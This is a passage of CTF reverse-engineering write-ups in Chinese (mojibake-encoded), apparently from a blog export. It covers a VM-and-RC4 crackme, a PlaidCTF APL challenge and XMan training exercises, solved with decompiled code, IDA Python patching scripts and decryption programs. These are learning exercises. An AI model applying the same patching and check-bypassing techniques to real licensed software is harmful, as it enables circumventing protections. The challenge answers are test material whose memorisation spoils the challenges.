0xB1, 0x51, 0x82, 0x04, 0x30, 0x56, 0x1F, 0x37, 0x72, 0x7A, 0x97, 0x50, 0x29, 0x86, 0x4A, 0x09, 0x3C, 0x59, 0xC4, 0x41, 0x71, 0xF8, 0x1A, 0xD2, 0x30, 0x88, 0x63, 0xFF, 0x85, 0xDE, 0x24, 0x8C, 0xC3, 0x37, 0x14, 0xC7 &#125;; int max_t = 0x5B028A8F, min_t = 0x5AFFE78F + 1; DWORD dst[768]; BYTE buf[256]; for(int t = min_t; t &lt;= max_t; ++t) &#123; srand(t); for(int i = 0; i &lt;= 255; ++i) buf[i] = table[i] ^ rand(); memset(dst, 0, 0xC00); for(int i = 0; i &lt;= 255; ++i) &#123; dst[3 * i] = buf[i]; dst[3 + i + 1] = 0x7FFFFFFF; dst[3 + i + 2] = 0; cal_n(dst, i); &#125; DWORD checksum = dst[766]; DWORD decryptkey = dst[767]; if(checksum == 0x700) &#123; printf(\"Found!\\n\"); printf(\"Time=%d, Deryptkey=%d\\n\", t, decryptkey); // time = 0x5b00e398 decryptkey = 0x322ce7a4 break; &#125; &#125; printf(\"Done!\\n\"); return 0;&#125; ä½¿ç”¨keypatchæ’ä»¶ä¿®æ”¹æ±‡ç¼–ä»£ç ï¼Œæ¥ç»•è¿‡æ—¶é—´éªŒè¯ï¼š ç»•è¿‡æ—¶é—´çš„checkåç»§ç»­æ‰§è¡Œï¼Œæ‰¾åˆ°å¦‚ä¸‹å‡½æ•°ï¼š 12345678910111213141516171819202122232425262728293031323334__int64 __fastcall sub_4023B1(const char *a1, __int64 a2, __int64 a3, __int64 a4)&#123; __int64 v4; // r9 __int64 v5; // r9 __int64 v6; // r9 __int64 v8; // [rsp+20h] [rbp-30h] __int64 v9; // [rsp+28h] [rbp-28h] __int64 v10; // [rsp+30h] [rbp-20h] __int64 v11; // [rsp+38h] [rbp-18h] int v12; // [rsp+43h] [rbp-Dh] char v13; // [rsp+47h] [rbp-9h] __int64 *v14; // [rsp+48h] [rbp-8h] if ( !Time_data[0] ) exit(0); v13 = 0; v12 = Time_data[0]; puts_enc((const char *)&amp;unk_4052A0, 49i64, Time_data[0], a4); v8 = 0i64; v9 = 0i64; v10 = 0i64; v11 = 0i64; LODWORD(v8) = 538976288; v14 = (__int64 *)((char *)&amp;v8 + 4); scanf(\"%26s\", (char *)&amp;v8 + 4, 538976288i64, 0i64, 0i64, 0i64); rc4_enc((__int64)v14, 26i64, (__int64)&amp;v12, 4i64); if ( !(unsigned int)vm_start((size_t)v14) ) return puts_enc((const char *)&amp;unk_4052D1, 6i64, Time_data[0], v4); rc4_enc((__int64)v14, 26i64, (__int64)&amp;v12, 4i64); sub_401FFB(); puts_enc((const char *)&amp;unk_4052E0, 35i64, Time_data[0], v5); puts((const char *)&amp;v8); return puts_enc((const char *)&amp;unk_4052E0, 35i64, Time_data[0], v6);&#125; è¿™é‡Œæœ‰ä¸€ä¸ªæ˜æ˜¾çš„rc4åŠ å¯†è¿‡ç¨‹ï¼Œå…·ä½“ä¸å¤šè¯´äº†ã€‚Key-scheduling algorithm (KSAï¼ŒKeyè°ƒåº¦ç®—æ³•)ï¼š 123456789101112131415161718192021222324252627282930__int64 __fastcall rc4_ksa(__int64 a1, __int64 a2, __int64 a3, char *sbox, unsigned int a5)&#123; __int64 result; // rax unsigned int v6; // eax char v7[263]; // [rsp+0h] [rbp-80h] unsigned __int8 v8; // [rsp+107h] [rbp+87h] unsigned int v9; // [rsp+108h] [rbp+88h] int i; // [rsp+10Ch] [rbp+8Ch] v9 = 0; result = 0LL; memset(v7, 0, 0x100uLL); v8 = 0; for ( i = 0; i &lt;= 255; ++i ) &#123; sbox[i] = i; result = i; v7[i] = *(_BYTE *)(i % a5 + a3); &#125; for ( i = 0; i &lt;= 255; ++i ) &#123; v6 = (unsigned int)((signed int)((unsigned __int8)v7[i] + v9 + (unsigned __int8)sbox[i]) &gt;&gt; 31) &gt;&gt; 24; v9 = (unsigned __int8)(v6 + v7[i] + v9 + sbox[i]) - v6; v8 = sbox[i]; sbox[i] = sbox[v9]; result = v8; sbox[v9] = v8; &#125; return result;&#125; Pseudo-random generation algorithm (PRGAï¼Œä¼ªéšæœºæ•°ç”Ÿæˆç®—æ³•)ï¼š 123456789101112131415161718192021222324252627__int64 __fastcall rc4_prga(__int64 a1, __int64 a2, char *input, char *sbox, unsigned int a5)&#123; unsigned int v5; // eax char v6; // ST0F_1 __int64 result; // rax unsigned int i; // [rsp+14h] [rbp-Ch] int v9; // [rsp+18h] [rbp-8h] unsigned int v10; // [rsp+1Ch] [rbp-4h] v10 = 0; v9 = 0; for ( i = 0; ; ++i ) &#123; result = i; if ( i &gt;= a5 ) break; v10 = (unsigned __int8)(((unsigned int)((signed int)(v10 + 1) &gt;&gt; 31) &gt;&gt; 24) + v10 + 1) - ((unsigned int)((signed int)(v10 + 1) &gt;&gt; 31) &gt;&gt; 24); v5 = (unsigned int)((v9 + (unsigned __int8)sbox[v10]) &gt;&gt; 31) &gt;&gt; 24; v9 = (unsigned __int8)(v5 + v9 + sbox[v10]) - v5; v6 = sbox[v10]; sbox[v10] = sbox[v9]; sbox[v9] = v6; input[i] ^= sbox[(unsigned __int8)(sbox[v10] + sbox[v9])]; &#125; return result;&#125; ç„¶åæ¥ä¸‹æ¥å¯¹è™šæ‹ŸæœºæŒ‡ä»¤ç»“æ„è¿›è¡Œåˆ†æï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121__int64 __fastcall vm_start(size_t sign, char *sig_func, __int64 a3, size_t a4)&#123; int cur_code; // eax __int64 v5; // rdx int v6; // ST12C_4 unsigned int v8; // [rsp+124h] [rbp-Ch] signed int loop; // [rsp+128h] [rbp-8h] int index; // [rsp+12Ch] [rbp-4h] strncpy((char *)sign, sig_func, a4); signal(sign, (void (__cdecl *)(int))sig_func); index = 0; loop = 1; v8 = 0; secret_str = (unsigned __int64)&amp;secret; rc4ed_input_str = (unsigned __int64)&amp;rc4ed_input; while ( loop ) &#123; cur_code = setjmp((_JBTYPE *)sign); // jmp to longjmp if ( cur_code == 168 ) // 0xA8 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] -= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 168 ) &#123; if ( cur_code == 172 ) // 0xAC &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] &amp;= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 172 ) &#123; if ( cur_code == 174 ) // 0xAE &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] ^= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &lt; 174 ) // 0xAD &#123; enc[(unsigned __int8)vm_code[index]] = (unsigned __int8)~LOBYTE(enc[(unsigned __int8)vm_code[index]]); ++index; &#125; else &#123; if ( cur_code != 175 ) // 0xAF goto LABEL_43; dword_409060 = (unsigned __int8)vm_code[index] &gt;&gt; 4; dword_409064 = vm_code[index] &amp; 0xF; if ( !setjmp((_JBTYPE *)sign) ) vm_code[index] = dword_409060 / (unsigned __int8)vm_code[index + 1];// divide 0 will occour exception index += 2; &#125; &#125; else if ( cur_code == 170 ) // 0xAA &#123; enc[(unsigned __int8)vm_code[index]] = enc[(unsigned __int8)vm_code[index + 1]]; index += 2; &#125; else if ( cur_code &gt; 170 ) // 0xAB &#123; enc[(unsigned __int8)vm_code[index]] = (unsigned __int8)vm_code[index + 1]; index += 2; &#125; else // 0xA9 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] += enc[vm_code[index] &amp; 0xF]; ++index; &#125; &#125; else if ( cur_code == 163 ) // 0xA3 &#123; enc[(unsigned __int8)vm_code[index] &gt;&gt; 4] |= enc[vm_code[index] &amp; 0xF]; ++index; &#125; else if ( cur_code &gt; 163 ) &#123; if ( cur_code == 166 ) // 0xA6 &#123; if ( !dword_409054 ) index += vm_code[index]; ++index; &#125; else if ( cur_code &gt; 166 ) // 0xA7 &#123; if ( dword_409054 ) index += vm_code[index]; ++index; &#125; else &#123; if ( cur_code != 165 ) goto LABEL_43; index += (unsigned __int8)vm_code[index] + 1; &#125; &#125; else if ( cur_code == 160 ) // 0xA0 &#123; enc[(unsigned __int8)vm_code[index]] = *(unsigned __int8 *)enc[(unsigned __int8)vm_code[index]]; ++index; &#125; else if ( cur_code == 162 ) // 0xA2 &#123; v6 = index + 1; enc[(unsigned __int8)vm_code[v6]] &gt;&gt;= enc[(unsigned __int8)vm_code[v6]]; index = v6 + 1; &#125; else // 0xCC &#123; if ( !cur_code ) &#123; v5 = (unsigned __int8)vm_code[index]; call_longjmp((_JBTYPE *)sign, (int)sig_func); &#125;LABEL_43: loop = 0; v8 = dword_409054; &#125; &#125; return v8;&#125; åŠ¨æ€è°ƒè¯•çš„æ—¶å€™ç›´æ¥æŠŠvmcodeä¸­çš„æ•°æ®dumpå‡ºæ¥ï¼Œé€šè¿‡å¯¹åˆ†æ”¯è¯­å¥çš„åˆ¤æ–­ï¼Œå¾—å‡ºå¦‚ä¸‹ç»“è®ºï¼š 123456789101112131415161718192021222324252627vmcode = [0xAB, 0x03, 0x00, 0xAB, 0x04, 0x1A, 0xAB, 0x00, 0x66, 0xAA, 0x05, 0x02, 0xA9, 0x53, 0xA0, 0x05, 0xAB, 0x06, 0xCC, 0xA9, 0x56, 0xAB, 0x06, 0xFF, 0xAC, 0x56, 0xAE, 0x50, 0xAD, 0x00, 0xAA, 0x06, 0x05, 0xAA, 0x05, 0x01, 0xA9, 0x53, 0xA0, 0x05, 0xAF, 0x56, 0x00, 0xA7, 0x01, 0xCC, 0xA9, 0x35, 0xAA, 0x05, 0x03, 0xAF, 0x54, 0x00, 0xA6, 0xD1, 0xCC, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]0xAB, 0x03, 0x00, // MOV enc[0x03], 0x000xAB, 0x04, 0x1A, // MOV enc[0x04], 0x1A0xAB, 0x00, 0x66, // MOV enc[0x00], 0x020xAA, 0x05, 0x02, // MOV enc[0x05], enc[0x02]0xA9, 0x53, // ADD enc[0x53 &gt;&gt; 4], enc[0x53 &amp; 0xF]0xA0, 0x05, // MOV enc[0x05], enc[0x05][0]0xAB, 0x06, 0xCC, // MOV enc[0x06], 0xCC0xA9, 0x56, // ADD enc[0x56 &gt;&gt; 4], enc[0x56 &amp; 0xF]0xAB, 0x06, 0xFF, // MOV enc[0x06], 0xFF0xAC, 0x56, // AND enc[0x56 &gt;&gt; 4], enc[0x56 &amp; 0xF]0xAE, 0x50, // XOR enc[0x50 &gt;&gt; 4], enc[0x50 &amp; 0xF]0xAD, 0x00, // MOV enc[0x00], ~LOBYTE(enc[0x00])0xAA, 0x06, 0x05, // MOV enc[0x06], enc[0x05]0xAA, 0x05, 0x01, // MOV enc[0x05], enc[0x01]0xA9, 0x53, // AND enc[0x53 &gt;&gt; 4], enc[0x53 &amp; 0xF]0xA0, 0x05, // MOV enc[0x05], enc[0x05][0]0xAF, 0x56, 0x00, // SUB 0x56 &gt;&gt; 4, 0(JMP to longjmp) ==&gt; MOV enc[0x56], longjmp()0xA7, 0x01, // if(sign) ==&gt; ADD $EIP, 0x010xCC, // JMP0xA9, 0x35, // AND enc[0x35 &gt;&gt; 4], enc[0x35 &amp; 0xF]0xAA, 0x05, 0x03, // MOV enc[0x05], enc[0x03]0xAF, 0x54, 0x00, // SUB 0x54 &gt;&gt; 4, 0(JMP to longjmp) ==&gt; MOV enc[0x54], longjmp()0xA6, 0xD1, // if(!sign) ==&gt; ADD $EIP, 0xD10xCC, // JMP0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 ç›¸åº”çš„æ±‡ç¼–ä¼ªä»£ç ï¼š 1234567891011121314151617181920212223242526272829r1 = secretr2 = rc4ed_inputMOV r3, 0x00MOV r4, 0x1AMOV r0, 0x66s1: MOV r5, r2 ADD r5, r3 MOV r5, byte r5 ; rc4ed_input[i] MOV r6, 0xCC ADD r5, r6 ; rc4ed_input[i] += 0xCC MOV r6, 0xFF AND r5, r6 ; rc4ed_input[i] &amp;= 0xFF XOR r5, r0 ; rc4ed_input[i] ^= r0 NOT r0/m8 ; r0 = ~r0 MOVZX r0, r0/m8 MOV r6, r5 MOV r5, r1 ADD r5, r3 MOV r5, byte r5 CMP r5, r6 JZ s2 STOPs2: ADD r3, r5 MOV r5, r3 TEST r5, r3 JNZ s2 STOP ä¼ªä»£ç : 1234567r0 = 0x66for i in range(0x26): x = ((rc4ed_input[i] + 0xCC) &amp; 0xFF) ^ r0 r0 = ~ r0 y = secret[x] if(x != y) break æ ¹æ®é€»è¾‘å¯ä»¥æ±‚å‡ºè¢«rc4åŠ å¯†è¿‡åçš„å­—ç¬¦ä¸²ï¼Œsecretæ•°ç»„çš„å€¼å¯ä»¥åœ¨ida pythonä¸­dumpå‡ºæ¥ï¼š 12345678910111213141516for addr in range(0x405320, 0x405340): print hex(idc.Byte(addr)) + ','r0 = 0x66secret = [0x89, 0xC1, 0xEC, 0x50, 0x97, 0x3A, 0x57, 0x59, 0xE4, 0xE6, 0xE4, 0x42, 0xCB, 0xD9, 0x08, 0x22, 0xAE, 0x9D, 0x7C, 0x07, 0x80, 0x8F, 0x1B, 0x45, 0x04, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]rc4ed_str = ''rc4ed_list = []for i in range(0x1A): for ch in range(0xFF + 1): t = ((ch + 0xCC) &amp; 0xFF) ^ r0 if(t == secret[i]): # rc4ed_str += chr(ch) rc4ed_list.append(hex(ch)) r0 = (~ r0) &amp; 0xFF# print rc4ed_strprint rc4ed_list åˆå› ä¸ºrc4æ˜¯å¯¹ç§°åŠ å¯†ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åœ¨è¾“å…¥éƒ¨åˆ†ä¸‹æ–­ç‚¹ï¼Œä¿®æ”¹è‡ªå·±çš„inputï¼Œå¯ä»¥åœ¨x64_dbgä¸­ä¿®æ”¹ï¼š idaä¸­å¯ä»¥é€šè¿‡ida pythonè·‘ä¸‹é¢çš„è„šæœ¬ä¿®æ”¹ï¼š 123456rc4ed_list = [0x23, 0x8c, 0xbe, 0xfd, 0x25, 0xd7, 0x65, 0xf4, 0xb6, 0xb3, 0xb6, 0xf, 0xe1, 0x74, 0xa2, 0xef, 0xfc, 0x38, 0x4e, 0xd2, 0x1a, 0x4a, 0xb1, 0x10, 0x96, 0xa5]reg = 0x22FBD4i = 0for addr in range(reg, reg + 0x1A): idc.PatchByte(addr, rc4ed_list[i]) i = i + 1 æœ€åå¯ä»¥åœ¨å†…å­˜é‡Œçœ‹åˆ°ä¸€éƒ¨åˆ†flagï¼Œé‡æ–°è¿è¡Œç¨‹åºè¾“å…¥åæ‘˜æ‰çœ¼é•œå¯ä»¥çœ‹åˆ°å®Œæ•´çš„flagã€‚ Irregular RE(PCTF-apl)å„ç§å„æ ·çš„æ ¼å¼æ–‡ä»¶ï¼š 1lua/python/java/lua-jit/hashell/applescript/js/solidity/webassembly/etcâ€¦ 12firmware/raw bin/risc-v/etcâ€¦chip8/avr/clemency/etcâ€¦ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œéœ€è¦æ‰¾åˆ°æ–‡ä»¶æ ¼å¼å¯¹åº”çš„è¯†åˆ«å™¨ã€åæ±‡ç¼–å™¨ã€åç¼–è¯‘å™¨ç­‰åï¼Œå†è¿›è¡Œæ­£å¼é€†å‘ã€‚ ä¸‹é¢åˆ†æä¸€ä¸‹PCTFä¸­çš„aplè¿™é¢˜ã€‚å…³äºaplçš„ç½‘ç«™ï¼Œå¯ä»¥åœ¨ç½‘ç«™ä¸Šäº†è§£å’Œå°è¯•aplçš„è¯­æ³•ã€‚ analysiså‡½æ•°å¯ä»¥åˆ†è§£æˆè¿™æ ·ï¼š 123â•IOâ†0â‹„&apos;BIEÂ°?Â½&gt;ILÂ½E.!!&lt;E!:E84Â¥Â¸Â²E23Ã…8Â»968&apos;&#123; &#123;âµ(~âµ)/&apos;success&apos; &apos;fail&apos;&#125;âŠƒ(+/âº=â•UCS 13+&#123;+/âµ/âŒ½2*â³â´âµ&#125;Â¨,/33 8â´(8Ã—â´âµ)â´7âŒ½â‰(-âŒŠ(â´&apos;f0xtr0t&apos;)Ã·2)âŒ½â‰11 24â´âˆŠ&#123;aâ‰ 8â†‘(0,aâ†(8â´2)âŠ¤âµ)&#125;Â¨âŒ½â•UCS âµ)=â´âº&#125;&apos;INPUT HERE&apos; è¢«åŠ å¯†çš„çš„å­—ç¬¦ä¸²å³enc = &#39;BIEÂ°?Â½&gt;ILÂ½E.!!&lt;E!:E84Â¥Â¸Â²E23Ã…8Â»968&#39;ã€‚é‚£ä¹ˆéœ€è¦è§£å†³çš„å°±æ˜¯ä»¥ä¸‹çš„åŠ å¯†è¿‡ç¨‹ï¼š 1&#123;â•UCS 13+&#123;+/âµ/âŒ½2*â³â´âµ&#125;Â¨,/33 8â´(8Ã—â´âµ)â´7âŒ½â‰(-âŒŠ(â´&apos;f0xtr0t&apos;)Ã·2)âŒ½â‰11 24â´âˆŠ&#123;aâ‰ 8â†‘(0,aâ†(8â´2)âŠ¤âµ)&#125;Â¨âŒ½â•UCS âµ&#125; ä¸‹é¢åšä¸€äº›åˆ†è§£ï¼š func1: {âµ(~âµ)/&#39;success&#39; &#39;fail&#39;} // judge func2: {+/âµ/âŒ½2*â³â´âµ} // bin_arr mul 2 func3: {aâ‰ 8â†‘(0,aâ†(8â´2)âŠ¤âµ)} 127 ==&gt; 0 1 1 1 1 1 1 1 // f(x) = x ^ (x &gt;&gt; 1) // 2âŠ¥0 1 1 1 1 1 1 1 ==&gt; 127 part1: &#39;abc&#39;{ {âµ(~âµ)/&#39;success&#39; &#39;fail&#39;}âŠƒ(+/âº=âµ)=â´âº}&#39;abc&#39; ==&gt; &#39;success&#39; part2: â•UCS // turn to ascii part3: (-âŒŠ(â´&#39;f0xtr0t&#39;)Ã·2) ==&gt; -3 // -(len(&#39;f0xtr0t&#39;) / 2) part4: 11 24â´âˆŠ{part3} &amp; 33 8â´ // turn into a axb matrix part5: âŒ½â‰ // matrix transposition åŠ å¯†çš„æ­¥éª¤ï¼š Convert to decimal Reverse the array Convert each value to an array of 8 bits and apply f(x) = x ^ (x &gt;&gt; 1) Reshape into 11x24 Transpose and retate by -3 Transpose and retate by 7 Reshape into 33x8 Convert to decimal and add 13 Convert to ascii reverseè§£å¯†å‡½æ•°ï¼š 1&#123;âŒ½â•UCS(&#123;2âŠ¥aâ‰ 8â†‘(0,aâ†(8â´2)âŠ¤âµ)&#125; â£ 7)Â¨ 2âŠ¥Â¨,/33 8â´(8Ã—â´âµ)â´â‰3âŒ½â‰Â¯7âŒ½11 24â´âˆŠ&#123;(8â´2)âŠ¤âµ&#125;Â¨ Â¯13+â•UCS âµ&#125; &apos;BIEÂ°?Â½&gt;ILÂ½E.!!&lt;E!:E84Â¥Â¸Â²E23Ã…8Â»968&apos; åˆ†è§£éƒ¨åˆ†ï¼š func1: {2âŠ¥aâ‰ 8â†‘(0,aâ†(8â´2)âŠ¤âµ)} // reverse f(x) = x ^ (x &gt;&gt; 1) &lt;== fun1 ^ (N - 1) = func1 ^ (-1) [x] func2: {(8â´2)âŠ¤âµ} // decimal to bits [x] part1: âŒ½ // reverse part2: {}â£7 // for 7 times é€†å‘çš„è¿‡ç¨‹ï¼š Convert to decimal Substract 13 Convert into an array of 8 bits Reshape into 11x24 Reverse the transpose-and-reverse process Reshape into 33x8 Convert to decimal Reverse the kind-of-xor process Convert to ascii Reverse the string","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://qianfei11.github.io/tags/ctf/"},{"name":"re","slug":"re","permalink":"https://qianfei11.github.io/tags/re/"}]},{"title":"XMan REï¼ˆä¸€ï¼‰","slug":"XMan-REï¼ˆä¸€ï¼‰","date":"2018-08-02T06:24:12.000Z","updated":"2018-10-07T09:43:57.696Z","comments":true,"path":"2018/08/02/XMan-REï¼ˆä¸€ï¼‰/","link":"","permalink":"https://qianfei11.github.io/2018/08/02/XMan-REï¼ˆä¸€ï¼‰/","excerpt":"XManæ­£å¼å­¦ä¹ çš„ç¬¬ä¸€å¤©ï¼Œå† æˆå¤§ä½¬å¸¦æˆ‘ä»¬å…¥é—¨é€†å‘ã€‚","text":"XManæ­£å¼å­¦ä¹ çš„ç¬¬ä¸€å¤©ï¼Œå† æˆå¤§ä½¬å¸¦æˆ‘ä»¬å…¥é—¨é€†å‘ã€‚ å›½é™…æ¯”èµ›: DEFCON CTF, C3CTF, HITCON CTF, TCTF, BKP CTF, Plaid CTF, WCTF, RECTFå›½å†…æ¯”èµ›: XCTF, HCTF, LCTF, å¼ºç½‘æ¯ æ‰“CTFå¾—åˆ°ä»€ä¹ˆ å®‰å…¨åŸºç¡€èƒ½åŠ› ä»£ç /æ–‡æ¡£çš„å¿«é€Ÿé˜…è¯» é€†å‘å·¥ç¨‹ è„†å¼±ç‚¹çš„æŒ–æ˜å’Œåˆ©ç”¨ é¢å‘å®‰å…¨çš„å¼€å‘ ç®—æ³•èƒ½åŠ› æ²Ÿé€šå’Œç¤¾äº¤ ToolsDisassembler IDA pro JEB ir BINARY NINJA Tracer API monitor Pin IPT (Intel Processor Trace) Debugger OD winDbg GDB kingstone capstone unicorn panda Decomplier Emulator Symbolic Execution angr Information gathering Pre file çœ‹å¹³å°ï¼Œæ¶æ„ï¼Œæ–‡ä»¶ç±»å‹ string çœ‹å…³é”®å­—ç¬¦ä¸²ï¼ŒGitHubæœä¸€æœ peid æŸ¥å£³ binwalk æŸ¥éšè—ä¿¡æ¯ ä¸€äº›å°çŸ¥è¯† åŠ¨æ€è°ƒè¯•ï¼šTaint Analysisï¼ˆæ±¡ç‚¹åˆ†æï¼‰ã€reverse code block by block å¸¸è§åŠ å¯†ç¼–ç ç®—æ³•ï¼šå¤§æ•°åŠ å‡ä¹˜é™¤ï¼Œæœ€çŸ­è·¯å¾„ï¼ŒåŠ¨æ€è§„åˆ’ç­‰ä¼ ç»Ÿç®—æ³• å¸¸è§æ•°æ®ç»“æ„ï¼šgraph/tree/hash table/etc å¸¸ç”¨è®¾è®¡æ¨¡å¼ï¼šproxy stub etc æ··æ·†ï¼ˆObfuscationï¼‰å¸¸è§æ–¹å¼ï¼šoolvmã€control flow flattenã€movfuscatorã€push rax,retã€vm/self modify code re0_0æ‹–è¿›idaï¼Œæ‰¾åˆ°mainå‡½æ•°ã€‚judgeå‡½æ•°ä¸èƒ½åç¼–è¯‘ï¼Œéœ€è¦å…ˆé€šè¿‡è„šæœ¬è§£å¯†ã€‚ 123456judge = 0x600B00for i in range(182): addr = 0x600B00 + i byte = get_bytes(addr, 1) byte = ord(byte) ^ 0x0C patch_byte(addr, byte) ç„¶åè¿˜æ˜¯ä¸èƒ½f5ï¼Œä¿®æ”¹å‡½æ•°ç»“æŸçš„åœ°å€ã€‚ ç„¶åå¯ä»¥çœ‹åˆ°å‡½æ•°çš„å†…å®¹ï¼š 12345678910111213141516171819202122232425262728signed __int64 __fastcall judge(char *a1)&#123; char v2[14]; // [rsp+8h] [rbp-20h] int i; // [rsp+24h] [rbp-4h] v2[0] = 102; v2[1] = 109; v2[2] = 99; v2[3] = 100; v2[4] = 127; v2[5] = 107; v2[6] = 55; v2[7] = 100; v2[8] = 59; v2[9] = 86; v2[10] = 96; v2[11] = 59; v2[12] = 110; v2[13] = 112; for ( i = 0; i &lt;= 13; ++i ) a1[i] ^= i; for ( i = 0; i &lt;= 13; ++i ) &#123; if ( a1[i] != v2[i] ) return 0LL; &#125; return 1LL;&#125; æ ¹æ®judgeå‡½æ•°çš„é€»è¾‘å†™å‡ºè§£å¯†è„šæœ¬ï¼š 123456789101112131415161718192021222324#include &lt;stdio.h&gt;#include &lt;string.h&gt;int main()&#123; char enc[15], flag[15]; enc[0] = 102; enc[1] = 109; enc[2] = 99; enc[3] = 100; enc[4] = 127; enc[5] = 107; enc[6] = 55; enc[7] = 100; enc[8] = 59; enc[9] = 86; enc[10] = 96; enc[11] = 59; enc[12] = 110; enc[13] = 112; for(int i = 0; i &lt; strlen(enc); i++) flag[i] = enc[i] ^ i; printf(\"%s\", flag); return 0;&#125; re1_0åœ¨windowsä¸‹æµ‹è¯•ä¸€ä¸‹è½¯ä»¶ï¼Œå¯ä»¥çœ‹åˆ°MessageBoxAå¥æŸ„ã€‚åœ¨idaä¸­æ‰¾åˆ°è¯¥å‡½æ•°ã€‚é€šè¿‡äº¤å‰å¼•ç”¨å‘ä¸Šè¿½æº¯å‡½æ•°ï¼Œç„¶åæ‰¾åˆ°å…³é”®éƒ¨åˆ†çš„æ±‡ç¼–ã€‚ é€šè¿‡idaå¿«æ·é”®påˆ›å»ºå‡½æ•°ã€‚ç„¶åf5åç¼–è¯‘ï¼Œå¾—åˆ°å…³é”®ä»£ç ï¼š 1234567891011121314151617181920212223int __thiscall sub_4015E0(CWnd *this)&#123; CWnd *v1; // esi int result; // eax char *v3; // [esp-4h] [ebp-Ch] char **v4; // [esp+4h] [ebp-4h] v1 = this; CWnd::UpdateData(this, 1); if ( *(_DWORD *)(*((_DWORD *)v1 + 165) - 8) == 33 &amp;&amp; (v3 = (char *)*((_DWORD *)v1 + 165), v4 = &amp;v3, CString::CString((CString *)&amp;v3, (CWnd *)((char *)v1 + 660)), sub_401630(v1, v3)) ) &#123; result = sub_4016E0(v1); &#125; else &#123; result = sub_401720(v1); &#125; return result;&#125; è¿™é‡Œå¯ä»¥çœ‹åˆ°å¯¹è¾“å…¥å­—ç¬¦ä¸²è¿›è¡Œäº†é•¿åº¦æ¯”è¾ƒï¼Œè¿˜æœ‰åŠ å¯†åçš„æ¯”å¯¹ã€‚ 1234567891011121314151617181920212223242526char __thiscall sub_401630(_BYTE *this, char *a2)&#123; int v2; // edi _BYTE *v3; // ebp int v4; // edx signed int v5; // esi char v7; // [esp+13h] [ebp-1h] v2 = 0; v3 = this; v7 = 1; v4 = 10; v5 = 0; do &#123; srand(v4); v4 = rand() % 10; if ( a2[v2] != v3[v5 + 96 + v4] ) v7 = 0; v5 += 10; ++v2; &#125; while ( v5 &lt; 330 ); CString::~CString((CString *)&amp;a2); return v7;&#125; è¿™é‡Œæœ‰ä¸€ä¸ªifæ¥åˆ¤æ–­è¾“å…¥å­—ç¬¦ä¸²åœ¨åŠ å¯†åæ˜¯å¦ä¸ç›®æ ‡ä¸²ç›¸ç­‰ï¼Œé€šè¿‡ç›´æ¥ä¿®æ”¹æ±‡ç¼–ä»£ç çš„æ–¹å¼æ¥è·³è¿‡åˆ¤æ–­ã€‚ ç„¶åé€šè¿‡åŠ¨æ€è°ƒè¯•æŸ¥çœ‹æ¯ä¸€æ¬¡è¢«movåˆ°alä¸­çš„å­—ç¬¦ï¼Œæ‹¼å‡‘èµ·æ¥å¾—åˆ°flagã€‚ 12345678910111213141516171819#include &lt;cstdio&gt;#include &lt;cstring&gt;#include &lt;random&gt;int main()&#123; int enc_num1[33] = &#123;0x66, 0x6C, 0x61, 0x67, 0x7B, 0x54, 0x68, 0x65, 0x2D, 0x59, 0x33, 0x6C, 0x6C, 0x30, 0x77, 0x2D, 0x74, 0x75, 0x72, 0x62, 0x34, 0x6E, 0x73, 0x2D, 0x55, 0x70, 0x172, 0x169, 0x124, 0x169, 0x16E, 0x167, 0x17D&#125;; char enc1[33]; for(int i = 0; i &lt; 33; i++) enc1[i] = char(enc_num1[i]); printf(\"%s\", enc1);// int count = 33, seed = 10;// while(count--)// &#123;// srand(seed);// seed = rand() % 10;// printf(\"%d\", seed);// &#125; return 0;&#125; re2_1æ‹–è¿›idaæŸ¥çœ‹mainå‡½æ•°ï¼š 123456789101112131415161718192021222324252627282930int __cdecl main(int argc, const char **argv, const char **envp)&#123; int result; // eax HANDLE v4; // eax DWORD NumberOfBytesWritten; // [esp+4h] [ebp-24h] char Buffer; // [esp+8h] [ebp-20h] print_string((int)aPleaseInputFla); scanf(a31s, &amp;Buffer); if ( strlen(&amp;Buffer) == 19 ) &#123; sub_401220(); v4 = CreateFileA(FileName, 0x40000000u, 0, 0, 2u, 0x80u, 0); WriteFile(v4, &amp;Buffer, 0x13u, &amp;NumberOfBytesWritten, 0); sub_401240(&amp;Buffer, &amp;NumberOfBytesWritten); if ( NumberOfBytesWritten == 1 ) print_string((int)aRightFlagIsYou); else print_string((int)aWrong); system(aPause); result = 0; &#125; else &#123; print_string((int)aWrong); system(aPause); result = 0; &#125; return result;&#125; mainå‡½æ•°ä¸­æœ‰ä¸€ä¸ªå¾ˆåƒflagçš„åœ°æ–¹ï¼Œä½†æ˜¯ç‚¹è¿›å»åé€»è¾‘æ˜¯é”™è¯¯çš„ï¼Œå¹¶ä¸”ä¼šå’Œä¸€ä¸ªå‡çš„flagæ¯”è¾ƒã€‚ å¾ˆå®¹æ˜“å‘ç°åœ¨æ¯”è¾ƒå‡flagä¹‹å‰æ‰§è¡Œäº†ä¸€ä¸ªsub_401220()å‡½æ•°ï¼Œæ˜¾ç„¶æ˜¯è—flagçš„åœ°æ–¹ã€‚å†ç»§ç»­è·Ÿç€é€»è¾‘èµ°ï¼Œå¯ä»¥æ‰¾åˆ°flag_place()ï¼š 12345678910111213141516171819202122232425262728293031323334353637383940signed int __cdecl flag_place(char *buf, signed int n)&#123; int i; // eax char t; // bl char v4; // cl int v5; // eax LOBYTE(i) = 0; if ( n &gt; 0 ) &#123; do &#123; if ( (_BYTE)i == 18 ) &#123; buf[18] ^= 0x13u; &#125; else &#123; if ( (char)i % 2 ) t = buf[(char)i] - i; else t = buf[(char)i + 2]; buf[(char)i] = i ^ t; &#125; LOBYTE(i) 